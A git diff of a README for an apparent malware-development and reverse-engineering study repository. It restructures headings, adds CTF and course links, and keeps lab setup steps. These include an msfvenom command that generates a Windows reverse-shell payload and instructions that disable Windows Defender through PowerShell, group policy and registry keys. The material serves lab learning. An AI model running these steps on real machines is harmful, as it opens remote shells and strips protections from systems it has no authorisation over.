@@ -1,20 +1,29 @@
-# Tools
+# Reverse Engineering
+
+- [CSAWCTFQualificationRound2018/](https://github.com/mohamedaymenkarmous/CTF/tree/master/CSAWCTFQualificationRound2018#a-tour-of-x86---part-1) by mohamedaymenkarmous.
+
+
+---
+
+# Malware Development
+
+## Tools
 - [Process Hacker](https://processhacker.sourceforge.io/)
 - Kali VM 
 - Windows 11 or 10 VM
 - Parrot 
 
 
-# Before getting started
+## Before getting started
 You might need to generate the payload in `Kali`.
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP_ADDR> LPORT=4444 -f c
 ```
 ![payload](./Screenshots/01.png)
 
-# Turn off the defender
+## Turn off the defender
 
-## Step 01
+### Step 01
 `Windows 10` or lower version should be fine after this step, but if you are testing in `Window 11+`, I recommend you to go through step 2 and 3 as well.
 ```powershell
 
@@ -24,7 +33,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 ![](./Screenshots/02.png)
 
-## Step 02
+### Step 02
 ```powershell
 # WIN + R
 gpedit.msc
@@ -41,18 +50,18 @@ gpedit.msc
 - Find Turn off `real-time protection` and set it to `Enabled`
 ![](./Screenshots/03.png)
 
-## Step 03
+### Step 03
 ```powershell
 # WIN + R 
 regedit
 ```
 Go to `HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender`
-### Then setup as follows:
+#### Then setup as follows:
 - DisableAntiSpyware = 1
 - DisableRoutinelyTakingAction = 1
 - ServiceStartStates = 4
 
-# Run Powershell as an administrator
+### Run Powershell as an administrator
 ```powershell
 Start-Process powershell -Verb runAs
 
@@ -65,8 +74,10 @@ powershell -Command "Start-Process cmd -Verb RunAs"
 ---
 
 # References
-- Most of codes are from [Malware-Development-for-Ethical-Hackers
+- [**Nightmare** - An amazing intro to binary exploitation / reverse engineering course](https://guyinatuxedo.github.io/index.html) by [guyinatuxedo](https://github.com/guyinatuxedo).
+- [**CTF Workshops** - About Challenges for Binary Exploitation Workshop](https://github.com/kablaa/CTF-Workshop) by [kablaa](https://github.com/kablaa).
+- [Malware-Development-for-Ethical-Hackers
 ](https://github.com/PacktPublishing/Malware-Development-for-Ethical-Hackers) by Zhassulan Zhussupov, 2024.
 - cocomelonc (Zhassulan Zhussupov) (2021) https://cocomelonc.github.io/ (blog).
-- [DLL Hijacking Basics](https://medium.com/@zapbroob9/dll-hijacking-basics-ea60b0f2a1d8) by Enes Adışen, 2023.
+- [Medium Tutorial - DLL Hijacking Basics](https://medium.com/@zapbroob9/dll-hijacking-basics-ea60b0f2a1d8) by Enes Adışen, 2023.
 
